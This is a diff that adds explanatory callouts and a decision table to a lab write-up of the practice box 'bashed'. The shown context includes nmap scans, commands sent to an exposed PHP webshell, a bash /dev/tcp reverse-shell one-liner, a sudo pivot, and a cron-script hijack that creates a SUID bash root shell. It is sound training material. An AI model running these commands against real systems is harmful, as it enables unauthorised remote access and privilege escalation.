@@ -49,6 +49,12 @@ sudo nmap -Pn -n -sU --top-ports 100 $BoxIP -oA nmap/udp-top100
 
 The full TCP scan returned only HTTP on port 80. Service detection identified Apache 2.4.18 on Ubuntu. The UDP top-100 check did not reveal a useful service.
 
+> [!abstract] 🧠 Why
+> The full scan establishes the external attack surface before the web workflow begins. The UDP result is only a quick triage check, so a negative top-100 result does not prove that no UDP service exists.
+
+> [!tip] 🛠️ Alternative tools
+> If raw SYN scanning is unavailable, use `nmap -sT`. For a quick confirmation of the discovered web service, `curl -I` or `nc -nv -z` can supplement Nmap without replacing the complete scan.
+
 ![[nmap-allports.png]]
 SCREENSHOT: TCP port scan showing only 80/tcp open.
 
@@ -68,6 +74,12 @@ grep -Ein 'cmd|command|POST|GET|shell_exec|system|passthru' "$BoxDir/loot/phpbas
 
 The development directory exposed `phpbash.php`, a functional PHP command shell. `phpbash.min.php` was also present, while `config.php` returned no useful content.
 
+> [!warning] 💡 Hint
+> Development directories deserve priority because they often contain debugging tools, test endpoints, or source that was never meant to be public. Read the returned PHP source before trying to upload a new payload. Here, the existing command shell is already the foothold.
+
+> [!tip] ⚡ More efficient path
+> Once a page clearly contains a command parameter, prove it with one harmless identity request. Do not spend time building a second webshell until you know whether the existing endpoint executes commands.
+
 ![[curl-homepage.png]]
 SCREENSHOT: Homepage source and the exposed development link.
 
@@ -84,6 +96,9 @@ curl -sS -X POST --data-urlencode 'cmd=id' http://$BoxIP/dev/phpbash.php
 
 The response showed command execution as `www-data`.
 
+> [!abstract] 🧠 Why
+> `id` proves both code execution and the security context. That identity determines which files, sudo rules, scheduled tasks, and network operations are worth testing next.
+
 ![[webshell-curl-id.png]]
 SCREENSHOT: Harmless `id` command executed through phpbash.
 
@@ -97,6 +112,12 @@ curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Po
 ```
 
 The callback arrived in the web application directory as `www-data`. Stabilize it:
+
+> [!warning] 💡 Common mistake
+> A web command shell and a reverse shell are separate problems. First confirm the web endpoint, then confirm the callback, then upgrade the terminal. If the callback fails, return to a harmless `id` request and test the listener address and egress path independently.
+
+> [!tip] 🛠️ Alternative tools
+> Python PTY upgrade is convenient, but `script -qc /bin/bash /dev/null` or a fully interactive SSH session can be used when the target has no suitable Python interpreter.
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -130,6 +151,12 @@ The important sudo rule was:
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
+
+> [!abstract] 🧠 Why
+> This is a run-as pivot, not root yet. `sudo -u scriptmanager` changes the user context and may expose files or privileges unavailable to `www-data`; always enumerate the new identity again after the switch.
+
+> [!warning] 💡 Hint
+> Read the exact sudo rule rather than assuming `NOPASSWD` means unrestricted root. The permitted target account and command determine the next enumeration branch.
 
 ![[sudo-l.png]]
 SCREENSHOT: Passwordless sudo rule permitting the run-as pivot.
@@ -169,6 +196,12 @@ SCREENSHOT: Original `test.py` content.
 
 The script was writable by `scriptmanager`, while `test.txt` was owned by root. File timestamps showed that the scheduled task was executing the script and updating the root-owned output.
 
+> [!warning] 💡 Hint
+> Writability alone is not enough. Prove that the script executes with a more privileged identity by checking an output file, ownership, timestamps, or a harmless marker. This avoids replacing a file that is never run.
+
+> [!tip] ⚡ Efficiency
+> Use `stat` to establish timing before attempting the payload. Once the modification interval matches a scheduled task, you can wait for one controlled execution instead of repeatedly guessing at cron configuration.
+
 ![[stat-timing.png]]
 SCREENSHOT: `stat` ownership and timestamp evidence showing the scheduled execution interval.
 
@@ -203,6 +236,9 @@ SCREENSHOT: Root-owned SUID Bash helper created by the scheduled task.
 
 The resulting Bash process had effective UID 0 and `whoami` returned `root`.
 
+> [!abstract] 🧠 Why
+> Bash drops privilege when invoked from a SUID copy unless `-p` preserves the effective UID. The important proof is `euid=0`, not merely the presence of a root-owned file.
+
 ![[root-shell.png]]
 SCREENSHOT: Root shell obtained through the SUID Bash helper.
 
@@ -233,6 +269,20 @@ boxdone
 ```
 
 If the helper was created with root ownership, a non-root shell cannot remove it. Perform cleanup before closing the root context, then verify that the helper is absent and the original script is restored.
+
+> [!warning] 💡 Common mistake
+> Restore scheduled scripts and remove SUID helpers before exiting the privileged context. Verify both the original file content and the absence of the helper, rather than assuming the cleanup command succeeded.
+
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| Public PHP command shell | Prove `id`, then request a callback | Use the existing HTTP command channel for enumeration if callbacks fail |
+| Passwordless sudo to another user | Switch with `sudo -u`, then re-enumerate | Inspect the target user's files and sudo rules before trying kernel paths |
+| Writable scheduled script with root-owned output | Replace it and wait for the schedule | Use `pspy` or timestamp polling to confirm execution timing |
+| SUID Bash helper created | Run with `-p` and verify `euid=0` | Restore the original script and remove the helper from the root context |
+
+The alternate routes are troubleshooting options. The completed chain is the one supported by the evidence captured above.
 
 ![[clean-down.png]]
 SCREENSHOT: Restored script and cleaned temporary helper.
